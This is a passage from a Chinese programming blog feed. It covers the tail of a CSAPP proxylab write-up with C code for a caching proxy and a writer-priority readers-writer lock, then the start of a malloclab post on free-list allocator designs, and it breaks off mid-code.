class="line">&#125;</span><br></pre></td></tr></table></figure><p>doit就复杂些了，因为基本包含了所有工作：</p><ol><li>负责获取client请求</li><li>解析client请求</li><li>转换成可以发送给server的请求</li><li>获取数据，可能从cache中获取，也可能从server中获取</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> src_uri[BUF_SIZE], dest_uri[BUF_SIZE], src_version[BUF_SIZE],</span><br><span class="line">            dest_version[BUF_SIZE], src_headers[BUF_SIZE], dest_headers[BUF_SIZE],</span><br><span class="line">            hostname[BUF_SIZE], server_port[BUF_SIZE];</span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * BUF_SIZE);</span><br><span class="line">    <span class="keyword">char</span> *request_to_server = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * BUF_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!buf || !request_to_server) &#123;</span><br><span class="line">        log_error(</span><br><span class="line">                <span class="string">"allocate memory for request which is sending to server faild\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* init */</span></span><br><span class="line">    <span class="built_in">memset</span>(src_uri, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(src_version, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(src_headers, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(hostname, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(request_to_server, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(server_port, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* parse request from client */</span></span><br><span class="line">    <span class="keyword">if</span> (parse_client_request(fd, src_uri, src_version, src_headers, hostname,</span><br><span class="line">                             server_port)) &#123;</span><br><span class="line">        log_error(<span class="string">"parse client request error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log_info(<span class="string">"request: %s\n"</span>, src_uri);</span><br><span class="line">    log_info(<span class="string">"http version: %s\n"</span>, src_version);</span><br><span class="line">    log_info(<span class="string">"headers: %s\n"</span>, src_headers);</span><br><span class="line">    log_info(<span class="string">"hostname: %s\n"</span>, hostname);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* convert uri , headers, version to the uri headers version that will be</span></span><br><span class="line"><span class="comment">     * send to server */</span></span><br><span class="line">    <span class="comment">/* append HOSTNAME first */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Host: %s\r\n"</span>, hostname);</span><br><span class="line">    <span class="built_in">strcat</span>(src_headers, buf);</span><br><span class="line">    <span class="keyword">if</span> (convert_request(src_uri, src_headers, src_version, dest_uri,</span><br><span class="line">                        dest_headers, dest_version)) &#123;</span><br><span class="line">        log_error(<span class="string">"convert request failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* constrcut request sending to server */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"GET %s %s\r\n"</span>, dest_uri, dest_version);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, buf);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, dest_headers);</span><br><span class="line">    <span class="built_in">strcat</span>(request_to_server, <span class="string">"\r\n"</span>); <span class="comment">/* end of requst */</span></span><br><span class="line">    log_info(<span class="string">"coneverted request to server:\n%s\n"</span>, request_to_server);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* fetch data  */</span></span><br><span class="line">    <span class="comment">/* is data in cache? */</span></span><br><span class="line">    cache_item *ci;</span><br><span class="line">    ci = cache_get(&amp;mycache, dest_uri);</span><br><span class="line">    <span class="keyword">int</span> read_len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (ci == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* fetch from server*/</span></span><br><span class="line">        <span class="keyword">if</span> ((read_len = fetch_data_from_server(request_to_server,</span><br><span class="line">                                               <span class="built_in">strlen</span>(request_to_server) + <span class="number">1</span>,</span><br><span class="line">                                               hostname, server_port, buf)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            log_error(<span class="string">"fetch data from server failed\n"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        log_info(<span class="string">"fetch data from server sucess %d\n"</span>, read_len);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* save to cache */</span></span><br><span class="line">        log_debug(<span class="string">"put data into cache\n"</span>);</span><br><span class="line">        cache_put(&amp;mycache, dest_uri, buf, read_len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* fetch from cache */</span></span><br><span class="line">        log_debug(<span class="string">"fetch data from cache\n"</span>);</span><br><span class="line">        read_len = ci-&gt;effect_size;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, ci-&gt;data, read_len);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* send data to client */</span></span><br><span class="line">    <span class="keyword">int</span> write_len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((write_len = send_data_to_client(fd, buf, read_len)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        log_error(<span class="string">"send data to client failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log_info(<span class="string">"send data to client sucess %d\n"</span>, write_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free resource */</span></span><br><span class="line">    <span class="built_in">free</span>(request_to_server);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个流程就是这样，处理起来不算来。下面我们主要看看整个流程中设计到的一些互斥资源。</p><ol><li>sbuf，互斥队列，这个是csapp提供了，我们可以直接用，内部采用“生产者-消费者”的思想+信号量的实现。</li><li>cache，典型的”读写锁“实现，个人这里采用的是写优先的读写锁信号量实现。</li></ol><h3 id="3-cache的实现"><a href="#3-cache的实现" class="headerlink" title="3. cache的实现"></a>3. cache的实现</h3><p>那下面就说一下cache的实现吧。</p><p>文中定义了cache的最大size和一个object的最大size。为了简单起见，我们按照max object size来分块，然后采用LRU算法来替换cache block。</p><p>首先看看用到的数据结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">   <span class="keyword">char</span> key[<span class="number">100</span>] ;     <span class="comment">/* use request uri as key */</span></span><br><span class="line">   <span class="keyword">char</span> data[MAX_OBJECT_SIZE];</span><br><span class="line">   <span class="keyword">size_t</span> effect_size;      <span class="comment">/* effect size */</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> age;      <span class="comment">/* use to implement LRU */</span></span><br><span class="line">&#125;cache_item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    cache_item *ci;</span><br><span class="line">    <span class="keyword">size_t</span> ci_num;     <span class="comment">/* cache item pair_num */</span></span><br><span class="line">&#125;cache;</span><br></pre></td></tr></table></figure><p>cache_item定义了一个cache block的数据及元数据。</p><p>cache则由多个cache_item组成了。</p><p>然后是要用到的一些函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_init</span><span class="params">(cache *cp)</span></span>;</span><br><span class="line"><span class="comment">/* cache_put */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_put</span><span class="params">(cache *cp, <span class="keyword">char</span> *key, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br><span class="line"><span class="comment">/* cache_get */</span></span><br><span class="line"><span class="function">cache_item *<span class="title">cache_get</span><span class="params">(cache *cp, <span class="keyword">char</span> *key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_deinit</span><span class="params">(cache *cp)</span></span>;</span><br></pre></td></tr></table></figure><p>接口很简单，就get、put。</p><p>先看看简单的init和deinit：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cache init</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @return 0 sucess</span></span><br><span class="line"><span class="comment"> *         -1 failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_init</span><span class="params">(cache *cp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!cp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* cache_get cache item pair_num */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> ci_num = MAX_CACHE_SIZE / MAX_OBJECT_SIZE;</span><br><span class="line">    cp-&gt;ci = (cache_item *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_item) * ci_num);</span><br><span class="line">    cp-&gt;ci_num = ci_num;</span><br><span class="line">    <span class="comment">/* init every cache block */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        cp-&gt;ci[i].effect_size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* semaphore init */</span></span><br><span class="line">    sem_init(&amp;rcounter_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;res_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;w_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * deinit</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_deinit</span><span class="params">(cache *cp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!cp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(&amp;cp-&gt;ci[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说get和put之前，先说说读写锁-写优先的操作。</p><ol><li>写-写互斥</li><li>写-读互斥</li><li>读-读共享</li><li>读加锁时，后续有读线程又有写线程时，写线程优先。</li></ol><p>看PV实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> read_counter = <span class="number">0</span>;<span class="comment">// 记录读者数</span></span><br><span class="line"><span class="keyword">sem_t</span> rc_mutex;<span class="comment">// 读者数的操作锁</span></span><br><span class="line"><span class="keyword">sem_t</span> res_mutex;<span class="comment">// 互斥资源锁</span></span><br><span class="line"><span class="keyword">sem_t</span> w_mutex;<span class="comment">// 实现写优先</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写者</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">P(&amp;w_mutex);<span class="comment">// 占用w_mutex, 阻塞读者</span></span><br><span class="line">P(&amp;res_mutex);</span><br><span class="line"><span class="keyword">do</span> <span class="built_in">write</span></span><br><span class="line">V(&amp;res_mutex);</span><br><span class="line">V(&amp;w_mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读着</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">P(&amp;w_mutex);</span><br><span class="line">P(&amp;rc_mutex);</span><br><span class="line">read_counter++;</span><br><span class="line"><span class="keyword">if</span>(read_counter == <span class="number">1</span>)</span><br><span class="line">P(&amp;res_mutex);</span><br><span class="line">V(&amp;rc_mutex);</span><br><span class="line">V(&amp;w_mutex);</span><br><span class="line"><span class="keyword">do</span> <span class="built_in">read</span></span><br><span class="line">P(&amp;rc_mutex);</span><br><span class="line">read_counter--;</span><br><span class="line"><span class="keyword">if</span>(read_counter == <span class="number">0</span>)</span><br><span class="line">V(&amp;res_mutex);</span><br><span class="line">V(&amp;rc_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok, 有了以上基础知识，写cache_get和cache_put就会很简单了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * put data into cache</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @param data</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> * @return  0 sucess</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_put</span><span class="params">(cache *cp, <span class="keyword">char</span> *key, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> age_counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> empty_block_idx = <span class="number">-1</span>;</span><br><span class="line">    cache_item *ci;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* write start */</span></span><br><span class="line">    P(&amp;w_mutex);</span><br><span class="line">    P(&amp;res_mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* increment age counter */</span></span><br><span class="line">    age_counter++;</span><br><span class="line">    <span class="comment">/* first try to find an empty block */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cp-&gt;ci[i].effect_size == <span class="number">0</span>) &#123;</span><br><span class="line">            empty_block_idx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* need evict ?*/</span></span><br><span class="line">    <span class="keyword">if</span> (empty_block_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        empty_block_idx = evict(cp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ci = &amp;cp-&gt;ci[empty_block_idx];</span><br><span class="line">    <span class="built_in">memcpy</span>(ci-&gt;key, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">memcpy</span>(ci-&gt;data, data, <span class="built_in">size</span>);</span><br><span class="line">    ci-&gt;effect_size = <span class="built_in">size</span>;</span><br><span class="line">    ci-&gt;age = age_counter;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* write end*/</span></span><br><span class="line">    V(&amp;res_mutex);</span><br><span class="line">    V(&amp;w_mutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * get data from cache in terms of key</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> *         NULL not found</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">cache_item *<span class="title">cache_get</span><span class="params">(cache *cp, <span class="keyword">char</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cache_item *ci = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* read start*/</span></span><br><span class="line">    P(&amp;w_mutex);</span><br><span class="line">    P(&amp;rcounter_mutex);</span><br><span class="line">    rcounter++;</span><br><span class="line">    <span class="keyword">if</span> (rcounter == <span class="number">1</span>)</span><br><span class="line">        P(&amp;res_mutex);</span><br><span class="line">    V(&amp;rcounter_mutex);</span><br><span class="line">    V(&amp;w_mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cp-&gt;ci[i].effect_size != <span class="number">0</span> &amp;&amp;</span><br><span class="line">            !<span class="built_in">strcmp</span>(cp-&gt;ci[i].key, key)) &#123;</span><br><span class="line">            ci = &amp;cp-&gt;ci[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    P(&amp;rcounter_mutex);</span><br><span class="line">    rcounter--;</span><br><span class="line">    <span class="keyword">if</span> (rcounter == <span class="number">0</span>)</span><br><span class="line">        V(&amp;res_mutex);</span><br><span class="line">    V(&amp;rcounter_mutex);</span><br><span class="line">    <span class="keyword">return</span> ci;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-cache实现的额外想法"><a href="#4-cache实现的额外想法" class="headerlink" title="4. cache实现的额外想法"></a>4. cache实现的额外想法</h3><p>其实cache最开始我是准备用Log-Strucutre的实现，但是发现实现起来很复杂，而且csapp的测试跑不了太久，Log-Sturcutre的优点没法充分利用。下面简单说一下思路。Log-Strucutre的特点就是Only-Append. 题目的要求是缓存从server返回的数据，而这些数据的大小不一，如果按照上文的实现，<strong>必然会导致很多内部碎片</strong>。而采用only-append的思想，则不存在内部碎片的问题，如下图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200906101718082.png" alt="image-20200906101718082"></p><p>但是这样又会存在一个新问题，那就是cache空间是有限的，我们最后总会evict掉某些块，<strong>那就很容产生外部碎片问题，</strong>这该怎么解决呢？开启一个compact线程就好了，compact线程可以周期性的对整个内存空间做压缩处理，去掉外部碎片问题。compact的触发点可以有两个：</p><ol><li>周期性触发</li><li>当前cache已满</li></ol><p>但是每次compact可能也会成为cache的读写性能瓶颈。 所以现在又该怎么办？</p><p>可以考虑<strong>“分页思想”，</strong>操作系统里面最经典的知识之一，要想提高系统的内存利用率，降低外部碎片和内部碎片，那就将内存分页，将每个取回的file进行分页,然后插入到“虚拟内存页”，不过这样需要维护页表了。实现难度较大，所以我也没做了，实在没时间继续耗在csapp上，不过还是想将这个思路写在这里，说不定未来我就回来写了呢。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>这个实验涉及的知识较多，网络编程（c语言的socket一言难尽啊，特别写过python和java后。。。），多线程并发，同步信号量，cache替换策略，每一个都是重要的知识点。所以也还是挺有收获的。</p><p>当然了，这也是csapp的最后一个lab，也就意味着我的csapp之旅告一段落了，但是csapp这本书是真的值得每个程序员多看几遍的，里面的每个知识点都相当重要。</p>]]></content>
      
      
      <categories>
          
          <category> Csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxylab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Csapp-Malloclab题解</title>
      <link href="/archives/36920455.html"/>
      <url>/archives/36920455.html</url>
      
        <content type="html"><![CDATA[<p>本次lab，malloclab，自己手写一个内存分配器。</p><a id="more"></a><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1. 实验目的"></a>1. 实验目的</h2><p>malloclab，简单明了的说就是实现一个自己的 malloc,free,realloc函数。做完这个实验你能够加深对指针的理解，掌握一些内存分配中的核心概念，如：如何组织heap，如何找到可用free block，采用first-fit, next-fit,best-fit?  如何在吞吐量和内存利用率之间做trade-off等。</p><p>就我个人的感受来说，malloclab的基础知识不算难，但是代码中充斥了大量的指针运算，为了避免硬编码指针运算，会定义一些宏，而定义宏来操作则会加大debug的难度（当然了，诸如linus这样的大神会觉得，代码写好了，为什么还用debug？），debug基本只能靠gdb和print，所以整体还是有难度了。</p><h2 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h2><p>这里简单说一下要做这个实验需要哪些背景知识。</p><p>首先，为了写一个alloctor,需要解决哪些问题。csapp本章的ppt中列出了一些关键问题：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/clip_image001.png" alt="Implementation Issues  How do we know how much memory to free given just a  pointer?  How do we keep track of the free blocks?  What do we do with the extra space when allocating a  structure that is smaller than the free block it is placed in?  How do we pick a block to use for allocation — many  might fit?  How do we reinsert freed block? "></p><p>第一个问题，free(ptr)这样的routine是如何知道本次释放的block的大小的？</p><p>很显然我们需要一些额外的信息来存放block的元信息。之类的具体做法是在block的前面添加一个word，存放分配的size和是否已分配状态。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826170802474.png" alt="image-20200826170802474"></p><p><strong>注意：这里只是给出了最简单的情况，实际操作中，额外的元数据不仅只有这些</strong></p><p>第二个问题，如何追踪free blocks?</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826170901374.png" alt="image-20200826170901374"></p><p>csapp一共给出了4种方案。其中implicit list在书上给出了源码，我个人实现了implicit list和explicit list。segregated free list感觉利用OO思想，把explicit list封装一下也是能够实现的，红黑树同理。</p><p>第三个问题，拆分策略（详见代码的place函数）</p><p>第四个问题，一般来说有 first-fit, next-fit和best-fit策略，我这里采用了最简单的first-fit策略。（这其实是一个trade-off的问题，看你是想要吞吐量高还是内存利用率高了）</p><p>ok，下面就来看看implicit list(书上有）和explicit list两种方案是如何实现的。</p><h2 id="3-Implicit-list"><a href="#3-Implicit-list" class="headerlink" title="3. Implicit list"></a>3. Implicit list</h2><p>下面是一个implicit list的组织方式和一个block的具体情况，一个block采用了双边tag，保证可以前向和后向索引。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826171525409.png" alt="image-20200826171525409"></p><p>这种方案的优点：实现简单。缺点：寻找free block的开销过大。</p><p>现在说说lab中给的一些代码把：</p><ol><li>memlib，这个文件中，给出了heap扩展的方法，除此之外，我们还可以获取当前可用heap的第一个字节，最后一个字节，heap size等。具体实现是通过一个sbrk指针来操作的。</li><li>mdriver, 这个文件不用看，只用它编译出来的可执行文件即可，用于测试我们写的allocator是否正确。</li><li>mm.c， 这个就是我们要操作的文件了，主要实现三个函数 mm_malloc,mm_free,mm_realloc，我们再额外定义自己需要的函数。</li></ol><p>好的，下面再说说具体代码，因为代码中涉及到很多指针操作，我们对这些操作做一个峰装，用宏定义来操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 